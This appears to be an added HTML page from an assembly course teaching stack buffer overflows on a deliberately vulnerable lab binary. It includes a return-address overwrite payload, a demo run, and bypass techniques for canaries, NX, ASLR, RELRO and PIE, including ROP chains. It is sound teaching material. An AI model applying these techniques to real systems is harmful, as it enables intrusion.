@@ -1,0 +1,209 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>Module 18 — Stack Exploitation & Mitigations</title>
+<link rel="preconnect" href="https://fonts.googleapis.com"/>
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin/>
+<link href="https://fonts.googleapis.com/css2?family=Playfair+Display:wght@700;900&family=Lato:wght@300;400;700&family=Source+Code+Pro:wght@400;600&display=swap" rel="stylesheet"/>
+<style>
+  :root{--bg:#0b0f1a;--bg2:#111827;--bg3:#1a2235;--card:#141c2e;--border:#1e3a5f;--gold:#f5c842;--cyan:#38bdf8;--purple:#a78bfa;--red:#f87171;--green:#4ade80;--teal:#0d9488;--orange:#fb923c;--text:#e2e8f0;--muted:#7a9bbf;--code-bg:#060d1a;}
+  *,*::before,*::after{box-sizing:border-box;margin:0;padding:0;}
+  body{background:var(--bg);color:var(--text);font-family:'Lato',sans-serif;font-size:17px;line-height:1.8;padding:0 0 80px;}
+  .hero{background:linear-gradient(160deg,var(--bg2) 0%,var(--bg3) 100%);border-bottom:1px solid var(--border);padding:60px 40px 50px;max-width:900px;margin:0 auto;}
+  .badge{display:inline-block;background:var(--border);color:var(--cyan);font-family:'Source Code Pro',monospace;font-size:12px;letter-spacing:2px;padding:4px 14px;border-radius:20px;margin-bottom:24px;text-transform:uppercase;}
+  h1{font-family:'Playfair Display',serif;font-size:2.8rem;color:var(--gold);line-height:1.2;margin-bottom:16px;}
+  .subtitle{color:var(--muted);font-size:1.1rem;font-weight:300;max-width:640px;}
+  .content{max-width:900px;margin:0 auto;padding:0 40px;}
+  .prereq{background:var(--card);border:1px solid var(--border);border-left:4px solid var(--teal);border-radius:8px;padding:20px 24px;margin:40px 0 0;}
+  .prereq strong{color:var(--teal);}
+  h2{font-family:'Playfair Display',serif;font-size:1.8rem;color:var(--cyan);margin:56px 0 20px;padding-bottom:8px;border-bottom:1px solid var(--border);}
+  h3{font-family:'Playfair Display',serif;font-size:1.25rem;color:var(--purple);margin:36px 0 14px;}
+  p{margin-bottom:16px;}ul,ol{margin:12px 0 20px 28px;}li{margin-bottom:8px;}
+  strong{color:var(--orange);}
+  pre{background:var(--code-bg);border:1px solid var(--border);border-radius:8px;padding:24px;overflow-x:auto;margin:20px 0;font-family:'Source Code Pro',monospace;font-size:14px;line-height:1.7;}
+  code{font-family:'Source Code Pro',monospace;font-size:.9em;background:var(--code-bg);border:1px solid var(--border);border-radius:4px;padding:2px 7px;color:var(--green);}
+  pre code{background:none;border:none;padding:0;font-size:inherit;color:var(--text);}
+  .comment{color:var(--muted);font-style:italic;}.kw{color:var(--cyan);}.num{color:var(--orange);}
+  .callout{border-radius:8px;padding:18px 22px;margin:28px 0;border-left:4px solid;}
+  .callout.tip{background:#0d1f1a;border-color:var(--green);}
+  .callout.warn{background:#1f1408;border-color:var(--orange);}
+  .callout.insight{background:#120d1f;border-color:var(--purple);}
+  .callout.danger{background:#1f0d0d;border-color:var(--red);}
+  .callout .label{font-family:'Source Code Pro',monospace;font-size:11px;font-weight:600;letter-spacing:1.5px;text-transform:uppercase;margin-bottom:8px;}
+  .callout.tip .label{color:var(--green);}.callout.warn .label{color:var(--orange);}.callout.insight .label{color:var(--purple);}.callout.danger .label{color:var(--red);}
+  table{width:100%;border-collapse:collapse;margin:20px 0;}
+  th{background:var(--bg3);color:var(--cyan);text-align:left;padding:10px 14px;border:1px solid var(--border);font-family:'Source Code Pro',monospace;font-size:13px;}
+  td{padding:10px 14px;border:1px solid var(--border);font-size:15px;}
+  tr:nth-child(even) td{background:var(--card);}
+  td code{border:none;background:none;color:var(--purple);}
+  .deliverables{background:var(--card);border:1px solid var(--border);border-radius:8px;padding:24px 28px;margin:20px 0;}
+  .deliverables li::marker{color:var(--gold);}
+  .shell{background:#010408;border:1px solid var(--border);border-radius:8px;padding:20px 24px;font-family:'Source Code Pro',monospace;font-size:13px;margin:16px 0;line-height:1.7;}
+  .shell .prompt{color:var(--teal);}.shell .out{color:var(--muted);}
+  .stack-diagram{font-family:'Source Code Pro',monospace;font-size:13px;background:var(--code-bg);border:1px solid var(--border);border-radius:8px;padding:20px;margin:20px 0;}
+  .stack-row{display:flex;gap:12px;align-items:center;padding:4px 0;}
+  .stack-addr{color:var(--muted);width:110px;flex-shrink:0;}
+  .stack-content{flex:1;padding:6px 12px;border-radius:4px;}
+  .stack-label{color:var(--muted);font-size:11px;margin-left:8px;}
+  .s-ret{background:#2a0a0a;border:1px solid var(--red);color:var(--red);}
+  .s-rbp{background:#1a1a2a;border:1px solid var(--purple);color:var(--purple);}
+  .s-buf{background:#0a1a0a;border:1px solid var(--green);color:var(--green);}
+  .exercise{background:var(--card);border:1px solid var(--border);border-radius:10px;padding:24px 28px;margin:24px 0;}
+  .exercise .ex-label{font-family:'Source Code Pro',monospace;font-size:11px;letter-spacing:1.5px;text-transform:uppercase;margin-bottom:10px;}
+  .ex-warmup .ex-label{color:var(--green);}.ex-core .ex-label{color:var(--cyan);}.ex-stretch .ex-label{color:var(--orange);}
+  .exercise h4{color:var(--text);font-size:1rem;margin-bottom:8px;}
+  .mit-grid{display:grid;grid-template-columns:1fr;gap:16px;margin:20px 0;}
+  .mit-row{display:grid;grid-template-columns:180px 1fr 1fr;gap:12px;align-items:start;background:var(--card);border:1px solid var(--border);border-radius:6px;padding:14px;}
+  .mit-name{font-family:'Source Code Pro',monospace;font-size:13px;color:var(--cyan);font-weight:600;}
+  .mit-what{font-size:14px;}
+  .mit-bypass{font-size:14px;color:var(--orange);}
+  .next-module{background:linear-gradient(135deg,var(--bg3),var(--card));border:1px solid var(--border);border-radius:10px;padding:30px 32px;margin-top:60px;}
+  .next-module h2{margin-top:0;border:none;padding:0;}
+</style>
+</head>
+<body>
+<div class="hero">
+  <div class="badge">Module 18 of 21 &mdash; Advanced Assembly</div>
+  <div class="badge"><a href="../README.md" style="color:inherit;text-decoration:none;">&larr; Course Index</a></div>
+  <h1>Stack Exploitation &amp; Mitigations</h1>
+  <p class="subtitle">The whole course distilled into one attack: a buffer overflow overwrites the return address and redirects <code>rip</code> to attacker-controlled code. Then each mitigation — stack canary, NX, ASLR, RELRO — raises the bar, and each bypass teaches you why the mitigation design made that bypass possible.</p>
+</div>
+<div class="content">
+  <div class="prereq"><strong>Prerequisites</strong> &mdash; Module 07 (call/ret, stack frame), Module 14 (ELF sections), Module 15 (mmap/mprotect), Module 16 (GOT/PLT). This module requires Linux.</div>
+
+  <div class="callout danger">
+    <div class="label">Educational Use Only</div>
+    The techniques in this module apply exclusively to your own systems, CTF challenges, authorized penetration testing engagements, and security research environments. Applying them to systems you do not own or have no explicit written permission to test is a criminal offence in most jurisdictions.
+  </div>
+
+  <h2>What You Will Build</h2>
+  <div class="deliverables"><ul>
+    <li><code>exploit/vuln.c</code> — deliberately vulnerable program with stack layout inspector and <code>secret_function</code> target</li>
+    <li><code>exploit/exploit.asm</code> — payload structure in assembly (shows how bytes are constructed)</li>
+    <li><code>exploit/gen_payload.py</code> — practical payload generator: 72 bytes padding + 8-byte little-endian address</li>
+  </ul></div>
+
+  <h2>The Stack Frame at RET</h2>
+  <p>When <code>vulnerable_copy()</code> executes <code>ret</code>, the CPU does <code>pop rip</code>: it loads the 8 bytes at <code>[rsp]</code> into the instruction pointer. If an overflow has placed the attacker's address at that location, execution jumps there.</p>
+
+  <div class="stack-diagram">
+    <div class="stack-row"><div class="stack-addr">rbp+16 →</div><div class="stack-content s-ret">return address (8 bytes)</div><div class="stack-label">← overwrite target</div></div>
+    <div class="stack-row"><div class="stack-addr">rbp+8  →</div><div class="stack-content s-rbp">saved rbp (8 bytes)</div><div class="stack-label">← overwrite step 2</div></div>
+    <div class="stack-row"><div class="stack-addr">rbp-63 →</div><div class="stack-content s-buf">char buf[64]</div><div class="stack-label">← overwrite step 1</div></div>
+    <div class="stack-row"><div class="stack-addr">rsp    →</div><div class="stack-content s-buf">(bottom of buf)</div><div class="stack-label"></div></div>
+  </div>
+
+  <p>Total bytes to overwrite before the return address: <strong>64 (buf) + 8 (saved rbp) = 72 bytes</strong>.</p>
+
+  <h2>The Payload Structure</h2>
+  <pre><code><span class="comment"># gen_payload.py output:</span>
+payload = b'A' * 72             <span class="comment"># fills buf + overwrites saved rbp</span>
+        + struct.pack('<Q', target_addr)  <span class="comment"># 8-byte LE return address</span>
+
+<span class="comment"># When strcpy copies this into buf[64]:</span>
+<span class="comment">#   buf[0..63]  = 0x41 × 64   (fill the 64-byte array)</span>
+<span class="comment">#   buf[64..71] = 0x41 × 8    (overwrite saved rbp — value doesn't matter)</span>
+<span class="comment">#   buf[72..79] = &secret_function in little-endian</span>
+<span class="comment">#</span>
+<span class="comment"># When ret executes:  pop rip → rip = &secret_function</span></code></pre>
+
+  <div class="callout insight">
+    <div class="label">Little-Endian and the Return Address</div>
+    x86-64 stores multi-byte values with the least significant byte at the lowest address. An address like <code>0x0000000000401234</code> is stored as the bytes <code>34 12 40 00 00 00 00 00</code>. Python's <code>struct.pack('&lt;Q', addr)</code> produces exactly this byte order. When the CPU reads 8 bytes from <code>[rsp]</code> during <code>ret</code>, it reconstructs the original address. If you forget little-endian order and write the bytes in the opposite order, <code>ret</code> will jump to a completely different — and probably unmapped — address, causing a segfault instead.
+  </div>
+
+  <h2>Running the Demo</h2>
+  <div class="shell">
+    <span class="prompt">$ </span>cd module_18 &amp;&amp; make vuln-unsafe<br/>
+    <span class="prompt">$ </span>./vuln-unsafe<br/>
+    <span class="out">=== Module 18: Stack Exploitation Demo ===
+secret_function is at: 0x401196
+
+=== Stack Frame Layout of inspect_stack_frame() ===
+  buf[0]  address:  0x7fffffffd870
+  buf[63] address:  0x7fffffffd8af
+  &rbp:             0x7fffffffd8b0
+  saved rbp value:  0x7fffffffd910
+  return address:   0x401385  (caller's next instruction)
+  secret_function:  0x401196
+  distance buf→ret: 72 bytes</span><br/>
+    <span class="prompt">$ </span>make disable-aslr  <span class="comment"># sudo required</span><br/>
+    <span class="prompt">$ </span>python3 exploit/gen_payload.py 0x401196 > /tmp/payload.bin<br/>
+    <span class="out">[*] Target address:    0x0000000000401196
+[*] Padding length:    72 bytes
+[*] Total payload:     80 bytes
+[*] Addr bytes (LE):   9611400000000000</span><br/>
+    <span class="prompt">$ </span>./vuln-unsafe "$(cat /tmp/payload.bin)"<br/>
+    <span class="out">[*] buf address:            0x7fffffffd880
+[!] secret_function() reached — return address was overwritten!
+[!] In a real exploit, this would be attacker shellcode.</span>
+  </div>
+
+  <h2>Mitigations — Mechanism and Bypass</h2>
+  <div class="mit-grid">
+    <div class="mit-row">
+      <div class="mit-name">Stack Canary<br/><code>-fstack-protector</code></div>
+      <div class="mit-what">A secret random value placed between the local variables and the saved rbp. Checked at function exit — abort if changed. Inserted by the compiler as <code>mov rax, fs:0x28; mov [rbp-8], rax</code>.</div>
+      <div class="mit-bypass">Bypass: leak the canary value via a format string or read primitive, then include the correct canary bytes in the payload so the check passes. Or: overwrite data before the canary (if target struct is before buf).</div>
+    </div>
+    <div class="mit-row">
+      <div class="mit-name">NX / DEP<br/><code>-z noexecstack</code></div>
+      <div class="mit-what">Stack and heap pages are non-executable (no PROT_EXEC). The CPU refuses to execute code on those pages. Controlled by the GNU_STACK ELF program header flags.</div>
+      <div class="mit-bypass">Bypass: Return-Oriented Programming (ROP) — chain small existing code snippets ("gadgets") ending in <code>ret</code>. No new code is injected; existing executable pages are reused.</div>
+    </div>
+    <div class="mit-row">
+      <div class="mit-name">ASLR<br/><code>sysctl randomize_va_space=2</code></div>
+      <div class="mit-what">The OS randomizes the load address of the binary (if PIE), stack, heap, and shared libraries each run. The attacker cannot know the address to overwrite with.</div>
+      <div class="mit-bypass">Bypass: information leak — read an address from a known location (e.g., via format string %p, or GOT entry visible through another primitive) to compute the ASLR slide, then calculate target addresses at runtime.</div>
+    </div>
+    <div class="mit-row">
+      <div class="mit-name">RELRO<br/><code>-z relro -z now</code></div>
+      <div class="mit-what">Full RELRO: the linker resolves all PLT symbols at load time, then marks the GOT read-only. Writing to a GOT entry (classic technique for redirecting function calls) causes a segfault.</div>
+      <div class="mit-bypass">Bypass: target a different writable function pointer — <code>__malloc_hook</code>, <code>__free_hook</code>, C++ vtables, or FILE* function pointer tables in libc's I/O structures.</div>
+    </div>
+    <div class="mit-row">
+      <div class="mit-name">PIE<br/><code>-pie</code></div>
+      <div class="mit-what">Position-Independent Executable: the binary itself is loaded at a random base address (not just libraries). Code addresses in the <code>.text</code> section are not predictable.</div>
+      <div class="mit-bypass">Same as ASLR bypass: leak a code pointer to determine the binary's base, then compute gadget addresses as base + known offset.</div>
+    </div>
+  </div>
+
+  <h2>Stack Canary at the Instruction Level</h2>
+  <pre><code><span class="comment">; Compiler inserts at function entry (with -fstack-protector-strong):</span>
+    <span class="kw">mov</span>    <span class="kw">rax</span>, <span class="kw">QWORD PTR</span> fs:0x28   <span class="comment">; load thread-local secret from TLS</span>
+    <span class="kw">mov</span>    <span class="kw">QWORD PTR</span> [rbp-8], <span class="kw">rax</span>    <span class="comment">; store canary just above return addr</span>
+    <span class="kw">xor</span>    <span class="kw">eax</span>, <span class="kw">eax</span>
+
+<span class="comment">; And at function exit:</span>
+    <span class="kw">mov</span>    <span class="kw">rax</span>, <span class="kw">QWORD PTR</span> [rbp-8]    <span class="comment">; reload canary</span>
+    <span class="kw">xor</span>    <span class="kw">rax</span>, <span class="kw">QWORD PTR</span> fs:0x28   <span class="comment">; compare with expected</span>
+    <span class="kw">jne</span>    __stack_chk_fail            <span class="comment">; abort if different</span>
+    <span class="kw">leave</span>
+    <span class="kw">ret</span></code></pre>
+
+  <h2>Exercises</h2>
+  <div class="exercise ex-warmup">
+    <div class="ex-label">Warm-up</div>
+    <h4>1. Confirm the 72-byte offset with GDB</h4>
+    <p>Build <code>vuln-unsafe</code>. Run under GDB: <code>gdb ./vuln-unsafe</code>. Break at <code>vulnerable_copy</code>, then <code>info frame</code> to see the saved rip address. Compute <code>saved_rip_addr - buf_addr</code> and verify it equals 72. Then break at the <code>ret</code> instruction and observe <code>x/gx $rsp</code> — initially it holds the legitimate return address. Step once more to watch <code>rip</code> change.</p>
+  </div>
+  <div class="exercise ex-core">
+    <div class="ex-label">Core</div>
+    <h4>2. Observe canary protection in action</h4>
+    <p>Build <code>vuln-safe</code> (stack canary enabled). Run the same overflow payload against it. You should see: <code>*** stack smashing detected ***: terminated</code>. Then run <code>make asm-canary</code> to generate the annotated assembly and find the <code>fs:0x28</code> pattern. Count the exact instructions between the canary store and check — this is the window an attacker would need to bypass. Verify that with the canary present, even a correct return address in the payload does not help because <code>__stack_chk_fail</code> aborts before <code>ret</code>.</p>
+  </div>
+  <div class="exercise ex-stretch">
+    <div class="ex-label">Stretch</div>
+    <h4>3. Build a 3-gadget ROP chain (NX bypass)</h4>
+    <p>With NX enabled (<code>-z noexecstack</code>) but ASLR off and no canary, build a ROP chain that calls <code>secret_function</code> without needing an executable stack. Use <code>ROPgadget --binary vuln-unsafe --rop</code> or <code>objdump -d vuln-unsafe | grep -B1 ret</code> to find a <code>pop rdi; ret</code> gadget. Then construct a chain: <code>[padding × 72] + [gadget addr] + [arg] + [secret_function addr]</code>. This demonstrates that NX alone — without ASLR — only raises the difficulty slightly when the binary contains usable gadgets.</p>
+  </div>
+
+  <div class="next-module">
+    <h2><a href="../module_19/tutorial.html" style="color:inherit;">What's Next — Module 19: Reading Disassembly &amp; Reverse Engineering Patterns</a></h2>
+    <p>Module 19 flips the direction: instead of writing assembly, you read it. Pre-compiled binary targets are provided — a simple cipher, a recursive function, a state machine, and a stripped binary — and you will use <code>objdump</code>, <code>gdb</code>, and manual analysis to reconstruct the original C logic from the machine code. You will recognize the compiler patterns from Module 17 appearing in real context: <code>lea</code> multiplies, <code>cmov</code> branches, loop unrolling, and calling conventions.</p>
+  </div>
+</div>
+</body>
+</html>
